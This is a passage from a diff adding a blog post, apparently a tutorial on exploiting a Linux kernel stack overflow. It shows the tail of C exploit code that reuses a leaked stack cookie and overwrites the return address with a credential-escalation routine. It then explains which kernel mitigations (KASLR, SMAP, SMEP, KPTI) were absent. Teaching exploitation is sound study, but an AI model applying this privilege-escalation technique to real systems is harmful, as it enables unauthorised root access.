+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">stack_cookie</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span> <span class="n">leak</span><span class="p">[</span><span class="mh">0x3</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">&#34;[+] StackCookie: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">stack_cookie</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">uint64_t</span> <span class="n">overflow</span><span class="p">[</span><span class="n">overflow_size</span><span class="p">];</span> <span class="c1">//8 * 8 = 64 bytez
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                          
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">overflow</span><span class="p">[</span><span class="mh">0x4</span><span class="p">]</span> <span class="o">=</span> <span class="n">stack_cookie</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">overflow</span><span class="p">[</span><span class="mh">0x5</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x4242424242424242</span><span class="p">;</span> <span class="c1">//rbp
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">overflow</span><span class="p">[</span><span class="mh">0x6</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">update_creds</span><span class="p">;</span> <span class="c1">//ret
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">w</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">overflow</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">overflow</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">&#34;[+] Wrote %d bytez</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">w</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">            
+</span></span></code></pre></div><p>The modified assembly code in the <em>update_creds</em> function added the <code>swapgs</code> instruction that is used to swap the <code>GS</code> registers betwen the Kernel and UserSpace. The saved registers were also pushed on the stack; in the order required before the execution of <code>iretq</code>.</p>
+<p>The above exploit worked because the following mitigations were not implemented:</p>
+<ul>
+<li>
+<p><code>KASLR</code> : This is the same as the UserLand ASLR, and if this was implemented it would have randomized the address of <code>commit_creds</code> and <code>prepare_kernel_creds</code>.</p>
+</li>
+<li>
+<p><code>SMAP</code>: Supervisor Mode Access Prevention is a protection that makes the user-space inaccessible no (RWX), if this was implemented we could not have access to the code stored in <code>update_creds</code>. In the Kernel this is enabled by setting the 20th bit of the Control Registers <code>CR4</code>. It can be bypassed by unsetting ths value, but due to additional mitigations this will not work.</p>
+</li>
+<li>
+<p><code>SMEP</code>: SuperVisor Mode Execution Prevention is an protection that makes the UserSpace non-executable and this is used together with SMAP. This is enabled by setting the 21st bit of the Control Register <code>CR4</code>.</p>
+</li>
+<li>
+<p><code>KPTI</code>: Kernel Page Table Isolation is a mitigation that is used to separate the Kernel and the User Space  page table instead of using just one set of page tables that contain both user-space and kernel-space addresses.</p>
+</li>
+</ul>
+<div id="conclusion" class="anchor"></div>
+<h2 class="relative group">Conclusion 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#conclusion" aria-label="Anchor">#</a></span>        
+    
+</h2>
+<p>This was a simple introduction to the Kernel Stack and how an overflow can be exploited. The above mentioned mitigations can also be bypassed, by some other techniques like <code>ROP</code>, <code>KTPI Trampoline</code> etc.. more on this can be found in the reference section.</p>
+<p>All the files used in this post can also be found <a href="https://github.com/mutur4/Linux-Kernel-Build-Scripts"   target="_blank">
+    here</a></p>
+<div id="references" class="anchor"></div>
+<h2 class="relative group">References 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#references" aria-label="Anchor">#</a></span>        
+    
+</h2>
+<ul>
+<li>[1] <a href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/"   target="_blank">
+    https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/</a></li>
+<li>[2] <a href="https://breaking-bits.gitbook.io/breaking-bits/exploit-development/linux-kernel-exploit-development"   target="_blank">
+    https://breaking-bits.gitbook.io/breaking-bits/exploit-development/linux-kernel-exploit-development</a></li>
+<li>[3] <a href="https://snyk.io/blog/kernel-privilege-escalation/"   target="_blank">
+    https://snyk.io/blog/kernel-privilege-escalation/</a></li>
+</ul>
+
+    </div>
+    <script>
+      var oid = "views_posts\/kernel-stack\/_index.md"
+      var oid_likes = "likes_posts\/kernel-stack\/_index.md"
+    </script>
+    
+    
+    <script type="text/javascript" src="/js/page.min.0e49973b4ad0a382c7c6012d8bff8226316642daabc4f8a20477bd08674f3da6e2fa993bc20ad4f51e7c5bb68e6f913a207a7c4fe37ea0e7b806894afce0a64e.js" integrity="sha512-DkmXO0rQo4LHxgEti/&#43;CJjFmQtqrxPiiBHe9CGdPPabi&#43;pk7wgrU9R58W7aOb5E6IHp8T&#43;N&#43;oOe4BolK/OCmTg=="></script>
+  </section>
+  
+  <section class="mt-10 prose dark:prose-invert">
+    <p class="py-8 border-t">
+      <em>There's no articles to list here yet.</em>
+    </p>
+  </section>
+  
+
+    
+
+  
+      <div class="pointer-events-none absolute top-[100vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
+  <a href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top" title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+    </main><footer class="py-10 print:hidden">
+  
+  
+    
+    <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
+      <ul class="flex flex-col list-none sm:flex-row">
+        
+        <li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
+          <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2" href="/tags/"
+            title="Tags">Tags</a>
+        </li>
+        
+      </ul>
+    </nav>
+    
+  
+  <div class="flex items-center justify-between">
+
+    
+    
+    <p class="text-sm text-neutral-500 dark:text-neutral-400">
+      &copy;
+      2023
+      BinaryChunk
+    </p>
+    
+
+    
+    
+    <p class="text-xs text-neutral-500 dark:text-neutral-400">
+      
+      
+      Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+        href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+        href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
+    </p>
+    
+
+  </div>
+  <script>
+    
+    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+      margin: 24,
+      background: 'rgba(0,0,0,0.5)',
+      scrollOffset: 0,
+    })
+    
+  </script>
+  
+  
+  <script type="text/javascript" src="/js/process.min.611c2f100351230a9f8fc00f14b270e9496cc3730da5a6d76742ce62982fe905bce336819ddb93eb75a002b363b7847f3a8d4d3a6feaf79861feb2c889ffae87.js" integrity="sha512-YRwvEANRIwqfj8APFLJw6Ulsw3MNpabXZ0LOYpgv6QW84zaBnduT63WgArNjt4R/Oo1NOm/q95hh/rLIif&#43;uhw=="></script>
+  
+  
+</footer><div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
+  data-url="https://mutur4.github.io/"
+  style="z-index:500"
+>
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
+  >
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0"
+        />
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)"
+      >
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+  </div>
+</body>
+
+<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js"
+  data-id="https://buymeacoffee.com/binarychunk" data-description="Support me on Buy me a coffee!" data-message=""
+  data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+
+</html>
